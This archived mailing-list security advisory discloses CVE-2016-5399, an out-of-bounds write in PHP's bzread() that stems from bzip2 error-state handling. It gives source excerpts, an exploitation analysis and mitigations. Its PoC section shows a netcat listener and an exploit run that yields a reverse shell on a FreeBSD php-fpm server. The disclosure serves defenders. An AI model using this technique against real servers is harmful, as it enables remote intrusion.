X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["8654" "Thursday" "21" "July" "2016" "05:39:36" "+0200" "Hans Jerry Illikainen" "hji@dyntopia.com" "<m1zipbbqx3.darpa@darpa.mil>" "329" "[oss-security] CVE-2016-5399: php: out-of-bounds write in bzread()" nil nil nil "7" "2016072103:39:36" "[oss-security] CVE-2016-5399: php: out-of-bounds write in bzread()" (number mark "U       hji@dyntopia Jul 21  329/8654  " thread-indent "\"[oss-security] CVE-2016-5399: php: out-of-bounds write in bzread()\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 17435 invoked by uid 550); 21 Jul 2016 03:38:41 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 17414 invoked from network); 21 Jul 2016 03:38:40 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=dyntopia-com.20150623.gappssmtp.com; s=20150623;
        h=from:to:subject:date:message-id:mime-version
         :content-transfer-encoding;
        bh=H4TH42nk/aJSc7mQYnBYQoddIPCNw6eiU5t0e3zDLyI=;
        b=bMUVmbqksg9C2LP1qg3Tcr8+5LRzxE2zRbxKgXpybWgZcuZZBhpPQslZWa5oTNFrD7
         f/ks7il89CliZZAGnc3XzuPXAKt7RU3HxlANGXVGwIfIAOLUmGBJdS+aNc5FMZEM+Hym
         oGriUpvSBDTxXVoyWjcz2vMn4bM6nYyrdV7YuusqKkMdV9sWegqDYahTA8yqsj+DhDpW
         WrpjgbuH3EHgBDVz39ifXB5KZ4P+I5z/bL0j8Jdyd4jCLBvkmBQOfAF+9WzA9rZBJ29M
         ztwOFkaTY3qLvTyosAfBbnkhtmBw24Ccwh80vtvsBNaoQNHhUPylOYgwjuWBFMsUm59e
         774Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:from:to:subject:date:message-id:mime-version
         :content-transfer-encoding;
        bh=H4TH42nk/aJSc7mQYnBYQoddIPCNw6eiU5t0e3zDLyI=;
        b=KRBzuD4GSmTCmJt2jJHG2BDHL2DhO146XTDqgtJfGppzHSfF+pouCSaQIf8xZlkCvg
         s6Q/9+ZC3Fm30/mLeqOrPeV45GJsMyUK8WMHtVGsey9TYDUnkrAbd4Y5TvptN7fTzKCt
         uBScH6Rivh2lA2W9R4MX2w+INVi9Epf724lTEH0omZJihytp47f2d43sO7O5yZpioyXx
         BxvUFVWq3frSfiwI73uwh+t+qjU58PzITOiS/lzuV8WKlgtEG7XdI+gwVkSj7kacrC3N
         oIatbiCEy5L9o20shaF2H4FddjkISNFJ9DehM7gZDghcnjW91BTkuChvmyVQib/0iPNz
         HLZg==
X-Gm-Message-State: ALyK8tJeWcyyYqxKnAFUvVvCN4ZrkzUdpN7pQK1sMdY2Fd3Fe1kdHbeVrikHez08R9Uv9w==
X-Received: by 10.195.17.137 with SMTP id ge9mr4945120wjd.68.1469072309050;
        Wed, 20 Jul 2016 20:38:29 -0700 (PDT)
From: Hans Jerry Illikainen <hji@dyntopia.com>
To: bugtraq@securityfocus.com, fulldisclosure@seclists.org, oss-security@lists.openwall.com
Date: Thu, 21 Jul 2016 05:39:36 +0200
Message-ID: <m1zipbbqx3.darpa@darpa.mil>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable
Subject: [oss-security] CVE-2016-5399: php: out-of-bounds write in bzread()

PHP 7.0.8, 5.6.23 and 5.5.37 does not perform adequate error handling in
its `bzread()' function:

php-7.0.8/ext/bz2/bz2.c
,----
| 364 static PHP_FUNCTION(bzread)
| 365 {
| ...
| 382     ZSTR_LEN(data) =3D php_stream_read(stream, ZSTR_VAL(data), ZSTR_L=
EN(data));
| 383     ZSTR_VAL(data)[ZSTR_LEN(data)] =3D '\0';
| 384
| 385     RETURN_NEW_STR(data);
| 386 }
`----

php-7.0.8/ext/bz2/bz2.c
,----
| 210 php_stream_ops php_stream_bz2io_ops =3D {
| 211     php_bz2iop_write, php_bz2iop_read,
| 212     php_bz2iop_close, php_bz2iop_flush,
| 213     "BZip2",
| 214     NULL, /* seek */
| 215     NULL, /* cast */
| 216     NULL, /* stat */
| 217     NULL  /* set_option */
| 218 };
`----

php-7.0.8/ext/bz2/bz2.c
,----
| 136 /* {{{ BZip2 stream implementation */
| 137
| 138 static size_t php_bz2iop_read(php_stream *stream, char *buf, size_t c=
ount)
| 139 {
| 140     struct php_bz2_stream_data_t *self =3D (struct php_bz2_stream_dat=
a_t *)stream->abstract;
| 141     size_t ret =3D 0;
| 142
| 143     do {
| 144         int just_read;
| ...
| 148         just_read =3D BZ2_bzread(self->bz_file, buf, to_read);
| 149
| 150         if (just_read < 1) {
| 151             stream->eof =3D 0 =3D=3D just_read;
| 152             break;
| 153         }
| 154
| 155         ret +=3D just_read;
| 156     } while (ret < count);
| 157
| 158     return ret;
| 159 }
`----

The erroneous return values for Bzip2 are as follows:

bzip2-1.0.6/bzlib.h
,----
| 038 #define BZ_SEQUENCE_ERROR    (-1)
| 039 #define BZ_PARAM_ERROR       (-2)
| 040 #define BZ_MEM_ERROR         (-3)
| 041 #define BZ_DATA_ERROR        (-4)
| 042 #define BZ_DATA_ERROR_MAGIC  (-5)
| 043 #define BZ_IO_ERROR          (-6)
| 044 #define BZ_UNEXPECTED_EOF    (-7)
| 045 #define BZ_OUTBUFF_FULL      (-8)
| 046 #define BZ_CONFIG_ERROR      (-9)
`----

Should the invocation of BZ2_bzread() fail, the loop would simply be
broken out of (bz2.c:152) and execution would continue with bzread()
returning RETURN_NEW_STR(data).

According to the manual [1], bzread() returns FALSE on error; however
that does not seem to ever happen.

Due to the way that the bzip2 library deals with state, this could
result in an exploitable condition if a user were to call bzread() after
an error, eg:

,----
| $data =3D "";
| while (!feof($fp)) {
|     $res =3D bzread($fp);
|     if ($res =3D=3D=3D FALSE) {
|         exit("ERROR: bzread()");
|     }
|     $data .=3D $res;
| }
`----


Exploitation
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

One way the lack of error-checking could be abused is through
out-of-bound writes that may occur when `BZ2_decompress()' (BZ2_bzread()
-> BZ2_bzRead() -> BZ2_bzDecompress() -> BZ2_decompress()) processes the
`pos' array using user-controlled selectors as indices:

bzip2-1.0.6/decompress.c
,----
| 106 Int32 BZ2_decompress ( DState* s )
| 107 {
| 108    UChar      uc;
| 109    Int32      retVal;
| ...
| 113    /* stuff that needs to be saved/restored */
| 114    Int32  i;
| 115    Int32  j;
| ...
| 118    Int32  nGroups;
| 119    Int32  nSelectors;
| ...
| 167    /*restore from the save area*/
| 168    i           =3D s->save_i;
| 169    j           =3D s->save_j;
| ...
| 172    nGroups     =3D s->save_nGroups;
| 173    nSelectors  =3D s->save_nSelectors;
| ...
| 195    switch (s->state) {
| ...
| 286       /*--- Now the selectors ---*/
| 287       GET_BITS(BZ_X_SELECTOR_1, nGroups, 3);
| 288       if (nGroups < 2 || nGroups > 6) RETURN(BZ_DATA_ERROR);
| 289       GET_BITS(BZ_X_SELECTOR_2, nSelectors, 15);
| 290       if (nSelectors < 1) RETURN(BZ_DATA_ERROR);
| 291       for (i =3D 0; i < nSelectors; i++) {
| 292          j =3D 0;
| 293          while (True) {
| 294             GET_BIT(BZ_X_SELECTOR_3, uc);
| 295             if (uc =3D=3D 0) break;
| 296             j++;
| 297             if (j >=3D nGroups) RETURN(BZ_DATA_ERROR);
| 298          }
| 299          s->selectorMtf[i] =3D j;
| 300       }
| 301
| 302       /*--- Undo the MTF values for the selectors. ---*/
| 303       {
| 304          UChar pos[BZ_N_GROUPS], tmp, v;
| 305          for (v =3D 0; v < nGroups; v++) pos[v] =3D v;
| 306
| 307          for (i =3D 0; i < nSelectors; i++) {
| 308             v =3D s->selectorMtf[i];
| 309             tmp =3D pos[v];
| 310             while (v > 0) { pos[v] =3D pos[v-1]; v--; }
| 311             pos[0] =3D tmp;
| 312             s->selector[i] =3D tmp;
| 313          }
| 314       }
| 315
| ...
| 613    save_state_and_return:
| 614
| 615    s->save_i           =3D i;
| 616    s->save_j           =3D j;
| ...
| 619    s->save_nGroups     =3D nGroups;
| 620    s->save_nSelectors  =3D nSelectors;
| ...
| 640    return retVal;
| 641 }
`----

bzip2-1.0.6/decompress.c
,----
| 070 #define GET_BIT(lll,uuu)                          \
| 071    GET_BITS(lll,uuu,1)
`----

bzip2-1.0.6/decompress.c
,----
| 043 #define GET_BITS(lll,vvv,nnn)                     \
| 044    case lll: s->state =3D lll;                      \
| 045    while (True) {                                 \
| ...
| 065    }
`----

If j >=3D nGroups (decompress.c:297), BZ2_decompress() would save its
state and return BZ_DATA_ERROR.  If the caller don't act on the
erroneous retval, but rather invokes BZ2_decompress() again, the saved
state would be restored (including `i' and `j') and the switch statement
would transfer execution to the BZ_X_SELECTOR_3 case -- ie. the
preceding initialization of `i =3D 0' and `j =3D 0' would not be executed.

In pseudocode it could be read as something like:

,----
| i =3D s->save_i;
| j =3D s->save_j;
|=20
| switch (s->state) {
| case BZ_X_SELECTOR_2:
|     s->state =3D BZ_X_SELECTOR_2;
|=20
|     nSelectors =3D get_15_bits...
|=20
|     for (i =3D 0; i < nSelectors; i++) {
|         j =3D 0;
|         while (True) {
|             goto iter;
| case BZ_X_SELECTOR_3:
| iter:
|     s->state =3D BZ_X_SELECTOR_3;
|=20
|     uc =3D get_1_bit...
|=20
|     if (uc =3D=3D 0) goto done;
|     j++;
|     if (j >=3D nGroups) {
|         retVal =3D BZ_DATA_ERROR;
|         goto save_state_and_return;
|     }
|     goto iter;
| done:
|     s->selectorMtf[i] =3D j;
`----

An example selector with nGroup=3D6:
,----
| 11111111111110
| ||||| `|||||| `- goto done; s->selectorMtf[i] =3D 13;
|  `=C2=B4     j++;
| j++;    goto save_state_and_return;
| goto iter;
`----

Since the selectors are used as indices to `pos' in the subsequent loop,
an `nSelectors' amount of <=3D 255 - BZ_N_GROUPS bytes out-of-bound writes
could occur if BZ2_decompress() is invoked in spite of a previous error.

bzip2-1.0.6/decompress.c
,----
| 304          UChar pos[BZ_N_GROUPS], tmp, v;
| 305          for (v =3D 0; v < nGroups; v++) pos[v] =3D v;
| 306
| 307          for (i =3D 0; i < nSelectors; i++) {
| 308             v =3D s->selectorMtf[i];
| 309             tmp =3D pos[v];
| 310             while (v > 0) { pos[v] =3D pos[v-1]; v--; }
| 311             pos[0] =3D tmp;
| 312             s->selector[i] =3D tmp;
| 313          }
`----

bzip2-1.0.6/bzlib_private.h
,----
| 121 #define BZ_N_GROUPS 6
`----


PoC
=3D=3D=3D

Against FreeBSD 10.3 amd64 with php-fpm 7.0.8 and nginx from the
official repo [2]:

,----
| $ nc -v -l 1.2.3.4 5555 &
| Listening on [1.2.3.4] (family 0, port 5555)
|=20
| $ python exploit.py --ip 1.2.3.4 --port 5555 http://target/upload.php
| [*] sending archive to http://target/upload.php (0)
|=20
| Connection from [target] port 5555 [tcp/*] accepted (family 2, sport 4947=
9)
| $ fg
| id
| uid=3D80(www) gid=3D80(www) groups=3D80(www)
|=20
| uname -imrsU
| FreeBSD 10.3-RELEASE-p4 amd64 GENERIC 1003000
|=20
| /usr/sbin/pkg query -g "=3D> %n-%v" php*
| =3D> php70-7.0.8
| =3D> php70-bz2-7.0.8
|=20
| cat upload.php
| <?php
| $fp =3D bzopen($_FILES["file"]["tmp_name"], "r");
| if ($fp =3D=3D=3D FALSE) {
|     exit("ERROR: bzopen()");
| }
|=20
| $data =3D "";
| while (!feof($fp)) {
|     $res =3D bzread($fp);
|     if ($res =3D=3D=3D FALSE) {
|         exit("ERROR: bzread()");
|     }
|     $data .=3D $res;
| }
| bzclose($fp);
| ?>
`----


Solution
=3D=3D=3D=3D=3D=3D=3D=3D

This issue has been assigned CVE-2016-5399 and can be mitigated by
calling bzerror() on the handle between invocations of bzip2.

Another partial solution has been introduced in PHP 7.0.9 and 5.5.38,
whereby the stream is marked as EOF when an error is encountered;
allowing this flaw to be avoided by using feof().  However, the PHP
project considers this to be an issue in the underlying bzip2
library[3].



Footnotes
_________

[1] [https://secure.php.net/manual/en/function.bzread.php]

[2] [https://github.com/dyntopia/exploits/tree/master/CVE-2016-5399]

[3] [https://bugs.php.net/bug.php?id=3D72613]


--=20
Hans Jerry Illikainen
